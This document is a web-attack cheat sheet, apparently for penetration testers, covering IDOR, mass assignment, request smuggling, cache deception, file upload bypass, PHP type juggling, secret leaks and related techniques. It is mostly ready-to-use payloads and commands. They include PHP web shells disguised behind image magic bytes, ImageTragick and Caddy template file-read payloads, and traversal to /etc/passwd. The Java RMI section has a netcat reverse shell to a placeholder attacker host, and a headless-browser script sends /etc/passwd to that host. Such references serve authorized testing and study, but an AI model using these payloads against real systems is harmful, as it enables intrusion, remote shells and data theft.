# Miscellaneous Web Attacks Reference

---

## IDOR (Insecure Direct Object References)

### Finding IDORs
```
# Numeric: increment/decrement
/api/orders/1337 → try 1336, 1338

# UUID v1: predictable from timestamp → use intruder-io/guidtool
guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00

# MongoDB ObjectID: 4-byte timestamp + 3-byte machine ID + 2-byte PID + 3-byte counter
# Tool: andresriancho/mongo-objectid-predict

# Hashed IDs: md5(email), sha1(username)
# Try hashing known values

# Base64 encoded: decode and modify

# Wildcards: try * % _ . in place of IDs
GET /api/users/* HTTP/1.1
```

### HTTP method tricks
```
# Try HTTP verb change
GET /api/users/123 → PUT /api/users/123 (body: changes)
# Content-type change
Content-Type: application/xml → Content-Type: application/json
# Array wrapping
{"id":19} → {"id":[19]}
# Parameter pollution
user_id=victim_id → user_id=victim_id&user_id=my_id
```

### Tools
- Autorize (Burp extension)
- AuthMatrix (Burp extension)
- Authz (Burp extension)

---

## Mass Assignment

### Common vectors
```json
// Add extra fields not in the form
{"username":"user","email":"u@u.com","isAdmin":true}
{"username":"user","role":"admin"}
{"price":"0.01"}
{"credits":999999}
```

```
# PHP example exploit
?authenticated=1&admin=1&role=admin
```

### Look for in code (Ruby/Rails)
```ruby
# Vulnerable
User.create(params[:user])
@user.update_attributes(params[:user])
# Safe
@user.update_attributes(params.require(:user).permit(:name, :email))
```

---

## Business Logic Errors

### Testing checklist
- **Negative values**: Add -1 items, negative price, negative quantity
- **Overflow**: Integer overflow on price/quantity
- **Currency arbitrage**: Pay in USD, refund in EUR (or vice versa)  
- **Coupon abuse**: Apply same coupon multiple times (race condition)
- **Rounding errors**: 0.5 satoshi → receiver gets 1, sender not charged
- **Workflow skipping**: Skip step in multi-step process (direct URL access)
- **State abuse**: Cancel subscription → still access premium
- **Trust manipulation**: Verified review without purchase
- **Race conditions**: Rate-limit bypass via simultaneous requests

### Examples
```
# Negative cart quantity
POST /cart {"item":"1","qty":-100,"price":10.00}
# Discount code multiple use
for i in {1..100}; do curl -d "code=SAVE10" https://target.com/checkout; done
# Mass transfer (rounding)
# Transfer 0.000000005 BTC repeatedly
```

---

## Race Conditions

### Single-packet attack (HTTP/2)
```python
# All requests arrive server simultaneously in one TCP packet
# Eliminates network jitter
# Turbo Intruder example:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

### Limit-overrun patterns
```
# Gift card / coupon redemption
# Transfer to multiple accounts simultaneously  
# Like/vote multiple times
# Concurrent registration with same email
```

### Burp Suite Turbo Intruder
```python
# Single-packet attack template
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2)
    for i in range(50):
        engine.queue(target.req, i, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Web Cache Deception

### Path appending
```
# Cached page: /profile (private, authenticated)
# Request: /profile/nonexistent.css
# Cache stores: /profile/nonexistent.css as CSS (public)
# Victim: attacker visits /profile/nonexistent.css → gets victim's profile
```

### Delimiter discrepancy
```
# Server treats ; as path separator, cache does not:
/profile;ignored.css → server returns /profile, cache caches as .css
/profile.css → server returns /profile, cache caches as CSS
/profile%0Aignored → URL normalization differences
/profile%23fragment.css
```

### Path normalization
```
/profile/../../../profile.css
/profile/..%2F..%2Fprofile.css
```

### Cache poisoning (Web Cache Poisoning)
```
# Inject unkeyed headers into cached response
X-Forwarded-Host: ATTACKER.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
Pragma: akamai-x-get-cache-key
```

---

## HTTP Request Smuggling

### CL.TE (Frontend uses Content-Length, backend uses Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Frontend uses TE, backend uses CL)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```

### TE.TE (Obfuscate TE header)
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### HTTP/2 → HTTP/1 desync
```http
:method: POST
:path: /
:scheme: https
:authority: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### HTTP/2 CRLF injection
```
# Inject \r\n in HTTP/2 header value
Foo: bar\r\nTransfer-Encoding: chunked
```

### Client-Side Desync
```javascript
fetch('https://target.com/', {
    method: 'POST',
    body: 'GET /attacker-route HTTP/1.1\r\nHost: target.com\r\n\r\n',
    mode: 'no-cors',
    credentials: 'include'
});
```

---

## File Upload Bypass

### Extension tricks
```
# PHP extensions (when .php blocked)
.php3 .php4 .php5 .php7 .phtml .phar .shtml .pht .pgif

# ASP/ASPX
.asp .aspx .asa .asax .ascx .ashx .asmx .cer .swf .xap

# JSP
.jsp .jspx .jsw .jsv .jspf

# Double extension
shell.php.jpg
shell.php%00.jpg    # Null byte (old PHP)
shell.php .jpg      # Space after
shell.php#.jpg

# Case variation
shell.PHP
shell.Php5

# Alternate stream (NTFS)
shell.asp::$DATA
```

### MIME bypass
```
# Change Content-Type in upload request
Content-Type: image/jpeg   → with .php extension

# Magic bytes (add to start of file)
GIF89a; <?php system($_GET['cmd']); ?>
\xff\xd8\xff<?php system($_GET['cmd']); ?>   # JPEG header
\x89PNG<?php system($_GET['cmd']); ?>        # PNG header
```

### .htaccess upload
```apache
# Upload .htaccess to trigger PHP execution on uploaded files
AddType application/x-httpd-php .jpg
php_value auto_prepend_file "/etc/passwd"
```

### Web config (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
      </handlers>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% Response.Write("shell") %>
```

### ImageMagick vulnerabilities
```
# CVE-2016-3714 (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/|id; false)'
pop graphic-context

# CVE-2022-44268 (PNG metadata read)
# Add tEXt chunk with profile=/etc/passwd to PNG
# ImageMagick includes file in output
```

### Other vectors
```
# FFmpeg HLS arbitrary read
# upload HLS playlist referencing local file paths

# Zip Slip
# Create archive with ../../../../etc/cron.d/backdoor path

# Package.json preinstall
{"scripts":{"preinstall":"id"}}

# Python .pth file (auto-imported)
import os; os.system('id')

# uwsgi.ini
[uwsgi]
; = &
module = os
callable = popen
workers = 2
threads = 1
```

---

## PHP Type Juggling

### Loose comparison vulnerabilities (`==`)
```php
# When type coercion is exploited
"0e123" == "0e456"  # TRUE (both "scientific notation" == 0^x)
"0" == false        # TRUE
"" == false         # TRUE
"0" == null         # FALSE
"php" == 0          # TRUE (string to int: "php" → 0)
100 == "1e2"        # TRUE
```

### Magic hashes (MD5 starting with 0e)
```
240610708 → 0e462097431906509019562988736854
QNKCDZO   → 0e830400451993494058024219903391
aabg7XSs  → 0e087386482136013740957780965295
```

### SHA1 magic hashes (0e prefix)
```
10932435112 → 0e07766915004133176347055865026311692244
```

### SHA256 magic hashes
```
TyNOQHUS → 0e66298694359207596086558843543959518835574979765100
```

### Auth bypass via type juggling
```php
# Loose comparison in PHP: 0 == "admin" is TRUE when admin converted to int = 0
# If password hashed with sha1: sha1([]) = NULL → sha1([]) == NULL → FALSE
# But: sha1(Array()) = NULL, NULL == false = TRUE in some comparisons

# Bypass: provide empty array where hash expected
password[]=
```

---

## API Key Leaks

### Common sources
```bash
# Git history
trufflehog github --org=TARGET
trufflehog git https://github.com/TARGET/REPO

# Docker images
trufflehog docker --image TARGET/IMAGE

# JS files (browser)
# Search in DevTools → Sources → Search (Ctrl+Shift+F)
# Pattern: apiKey, api_key, secret, token, key=, Authorization: Bearer
```

### Validation
```bash
# AWS
curl "https://sts.amazonaws.com/?Action=GetCallerIdentity&SignatureVersion=4..." 
# AWS key format: AKIA[A-Z0-9]{16}

# Telegram bot
curl https://api.telegram.org/bot<TOKEN>/getMe

# GitHub
curl -H "Authorization: token TOKEN" https://api.github.com/user

# Nuclei
nuclei -t token-spray/ -var token=TOKEN
```

### Tools
- `trufflesecurity/trufflehog`
- `aquasecurity/trivy`
- `mazen160/secrets-patterns-db`
- `streaak/keyhacks`

---

## Dependency Confusion

```bash
# Find internal package names (package.json, requirements.txt, composer.json)
# Check if public registry has same name:
npm search INTERNAL-PACKAGE-NAME
pip search INTERNAL-PACKAGE-NAME

# Register public package with same name → higher version number
# Internal tooling fetches public version → RCE on developer/CI machine

# Tools
confused --scan package.json
DepFuzzer --url https://target.com
```

---

## Zip Slip

```python
# Create malicious archive
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

# Symlink in zip
ln -s ../../../index.php symindex.txt
zip --symlinks exploit.zip symindex.txt

# Archives: ZIP, TAR, JAR, WAR, CPIO, APK, RAR, 7Z
```

---

## Insecure Randomness

### Predictable token types
| Token Type | Predictable Because |
|------------|---------------------|
| UUID v1 | Based on timestamp + MAC address |
| MongoDB ObjectID | Timestamp + machine ID + PID + counter |
| PHP uniqid() | Microsecond timestamp |
| PHP mt_rand() | Crackable with 2 outputs |
| Python time-seeded | Seeds from `time.time()` |

### Tools
```bash
# UUID v1 prediction
guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000

# MongoDB ObjectID prediction
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37

# PHP mt_rand crack
./reverse_mt_rand.py 712530069 674417379 123 1

# Time-based reset token (sandwich attack)
reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "user@example.com"
reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt
```

---

## Encoding Transformations

### Unicode normalization bypass
| Character | Unicode | After Normalization |
|-----------|---------|---------------------|
| `‥` | U+2025 | `..` |
| `／` | U+FF0F | `/` |
| `＇` | U+FF07 | `'` |
| `﹣` | U+FE63 | `--` |
| `＜` | U+FF1C | `<` |
| `﹛` | U+FE5B | `{` |
| `ｐ` | U+FF50 | `p` |
| `ª` | U+00AA | `a` |

```python
import unicodedata
payload = "ｐＨＰ＞"  
print(unicodedata.normalize('NFKC', payload))  # → "PHP>"
```

### Punycode homograph
```
# раypal.com → xn--ypal-43d9g.com (Cyrillic 'р' looks like 'p')
# In MySQL: SELECT 'a' = 'ᵃ' → 1 (case-insensitive collation)
# Abuse in password reset / OAuth
```

---

## Reverse Proxy Misconfigurations

### Nginx off-by-slash (alias traversal)
```
# Config: location /styles { alias /path/css/; }
# Vulnerable: /styles../secret.txt → /path/css/../secret.txt → /path/secret.txt
curl https://target.com/styles../../../etc/passwd
```

### Nginx missing root location
```
# Config: root /etc/nginx; (no location /)
# Vulnerable: /nginx.conf → /etc/nginx/nginx.conf
curl https://target.com/nginx.conf
```

### Caddy template injection (Go templates)
```bash
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
# Payloads:
{{env "SECRET_KEY"}}
{{listFiles "/"}}
{{readFile "path/to/file"}}
```

### Trusted headers (IP spoofing)
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Original-Forwarded-For: 127.0.0.1
```

---

## Virtual Hosts

```bash
# Enumerate VHOSTs
gobuster vhost -u https://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
VHostScan -t 10.10.10.10 -wordlist vhosts.txt

# Manual fingerprinting
curl -H "Host: admin.example.com" http://10.10.10.10/
curl -H "Host: internal.example.com" http://10.10.10.10/

# Bypass WAF/Cloudflare via real IP
# DNS history: check Shodan/SecurityTrails/Censys for old IPs
# TLS SAN names in certificate often list all vhosts
```

---

## DNS Rebinding

### Attack flow
1. Register malicious domain with short TTL DNS
2. Victim visits attacker page → initial DNS = external IP
3. After page load, DNS rebinds to `127.0.0.1`
4. Page JS makes requests to `window.location.origin` → hits localhost

### Bypass protections (0.0.0.0, CNAME)
```
0.0.0.0         → Treated as localhost by browsers
CNAME → internal-host.local  → DNS protection only blocks IPs
CNAME → localhost            → Bypasses 127.0.0.1 filter
```

### Tools
- nccgroup/singularity
- rebind.it
- taviso/rbndr

---

## Brute Force / Rate Limit Bypass

### IP rotation
```bash
# ProxyChains
random_chain
proxychains ffuf -w list.txt -u https://target.com/login -X POST -d "u=FUZZ"

# FFUF with rotating X-Forwarded-For
ffuf -w ipv4-list.txt:FUZZ -u https://target.com/login -H "X-Forwarded-For: FUZZ"

# IPv6 rotation (provider /64 = 18 quintillion IPs)
```

### Burp Intruder attack types
| Type | Use case |
|------|----------|
| Sniper | Single parameter wordlist |
| Battering Ram | Same payload in all positions |
| Pitchfork | Parallel lists (user:pass pairs) |
| Cluster Bomb | All combinations |

### TLS fingerprint bypass (JA3)
```bash
# Use curl-impersonate to mimic real browser
curl-impersonate-chrome https://target.com/login -d "..."
# Or use Puppeteer/Playwright for full browser fingerprint
```

---

## Insecure Management Interfaces

```bash
# Discovery
nuclei -t http/exposed-panels -u https://example.com
nuclei -t http/default-logins -u https://example.com

# Common admin panels
/admin /administrator /wp-admin /cpanel /phpmyadmin
/manager /management /console /dashboard

# Default credentials
admin:admin, admin:password, admin:123456, root:root
```

---

## Java RMI

```bash
# Detect
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p 1099 TARGET

# Enumerate
rmg scan TARGET --ports 0-65535
rmg enum TARGET 9010

# Attack (beanshooter)
beanshooter enum TARGET 1090
beanshooter standard TARGET 9010 exec 'nc ATTACKER 4444 -e ash'
beanshooter serial TARGET 1090 CommonsCollections6 "nc ATTACKER 4444 -e ash"

# Metasploit
use exploit/multi/misc/java_rmi_server
```

---

## Source Code Management Leaks

```bash
# Exposed .git
curl http://target.com/.git/HEAD         # If accessible, dump repo
git-dumper http://target.com/.git/ output/

# SVN
curl http://target.com/.svn/entries
svn ls http://target.com/.svn/

# Mercurial
curl http://target.com/.hg/store/

# Bazaar
curl http://target.com/.bzr/

# Tools
git-dumper, gitdumper, trufflehog
```

---

## Headless Browser Attacks

```bash
# Local file read (if --allow-file-access flag)
<script>
  fetch("file:///etc/passwd").then(r=>r.text()).then(d=>fetch("https://ATTACKER/?d="+d))
</script>

# Remote debugging port exposure (default 9222)
curl http://127.0.0.1:9222/json/version
# Connect via chrome://inspect/#devices

# PDF/Screenshot SSRF
<script>window.location="/etc/passwd"</script>
<iframe src="/etc/passwd"></iframe>

# DNS rebinding against headless browser
# AAAA → external, A → internal; browser fallbacks to IPv4
```

### External Variable Modification (PHP extract())
```
# Vulnerable: extract($_GET);
# Exploit: ?authenticated=1&admin=true&page=../../etc/passwd
# Overwrite $authenticated, $admin, $page variables
```
